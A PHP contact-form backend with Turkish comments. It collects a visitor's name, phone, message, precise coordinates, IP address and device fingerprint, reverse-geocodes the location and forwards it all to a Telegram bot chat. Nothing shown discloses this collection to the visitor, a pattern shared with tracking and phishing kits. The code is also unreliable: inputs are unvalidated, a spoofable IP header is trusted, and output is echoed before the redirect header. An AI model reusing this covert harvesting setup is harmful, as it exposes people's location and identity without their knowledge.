<?php
// Telegram Bot Token ve Chat ID
$telegramToken = ''; // Bot Token
$chatId = ''; // Telegram chat ID'nizi buraya yazın

// Kullanıcıdan gelen verileri al
$name = $_POST['name'];
$phone = $_POST['phone'];
$message = $_POST['message'];
$location = $_POST['location']; // Konum bilgisini al
$phoneBrand = $_POST['phoneBrand']; // Telefon markası
$userAgent = $_POST['userAgent']; // Tarayıcı bilgisi
$platform = $_POST['platform']; // Cihaz platformu
$screenWidth = $_POST['screenWidth']; // Ekran genişliği
$screenHeight = $_POST['screenHeight']; // Ekran yüksekliği
$timeZone = $_POST['timeZone']; // Zaman dilimi

// Kullanıcının IP adresini al
$userIP = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR']; // Proxy desteği

// Enlem ve boylam bilgilerini ayrıştırma
preg_match('/Latitude: ([^,]+), Longitude: ([^,]+)/', $location, $matches);
$latitude = $matches[1];
$longitude = $matches[2];

// Google Maps linkini oluştur
$googleMapsLink = "https://www.google.com/maps?q=$latitude,$longitude"; // Google Maps linki

// Google Geocoding API ile adres bilgisini alma
function get_geolocation($latitude, $longitude) {
    $apiKey = 'YOUR_GOOGLE_API_KEY'; // Google API key

    // API URL
    $url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=$latitude,$longitude&key=$apiKey";

    // cURL ile API'den yanıt al
    $response = file_get_contents($url);
    $data = json_decode($response, true);

    // Adres bilgilerini döndür
    if (isset($data['results'][0])) {
        return $data['results'][0]['formatted_address']; // Adresi al
    }

    return 'Adres bilgisi bulunamadı';
}

$address = get_geolocation($latitude, $longitude); // Konumu al ve adresi döndür

// Telegram API'ye mesaj gönderecek URL
$url = "https://api.telegram.org/bot$telegramToken/sendMessage";

// Gönderilecek mesajı oluştur
$messageToSend = "Yeni Mesaj\n\n";
$messageToSend .= "Ad Soyad: " . $name . "\n";
$messageToSend .= "Telefon: " . $phone . "\n";
$messageToSend .= "Telefon Markası: " . $phoneBrand . "\n";
$messageToSend .= "Tarayıcı: " . $userAgent . "\n";
$messageToSend .= "Platform: " . $platform . "\n";
$messageToSend .= "Mesaj: " . $message . "\n";
$messageToSend .= "Konum: $googleMapsLink\n"; // Google Maps linki
$messageToSend .= "Adres: $address\n"; // Google Geocoding API'den alınan adres
$messageToSend .= "IP Adresi: $userIP\n"; // IP adresi
$messageToSend .= "Ekran Çözünürlüğü: {$screenWidth}x{$screenHeight}\n"; // Ekran çözünürlüğü
$messageToSend .= "Zaman Dilimi: $timeZone\n"; // Zaman dilimi

// Telegram API'ye mesaj göndermek için cURL kullan
$data = [
    'chat_id' => $chatId,
    'text' => $messageToSend
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

// cURL işlemi başlat
$response = curl_exec($ch);

// cURL hatalarını kontrol et
if ($response === false) {
    echo 'cURL Error: ' . curl_error($ch);
} else {
    echo 'Response: ' . $response;
}

curl_close($ch);

// Kullanıcıyı teşekkür mesajına yönlendir
header("Location: thank_you.html");
exit;
?>
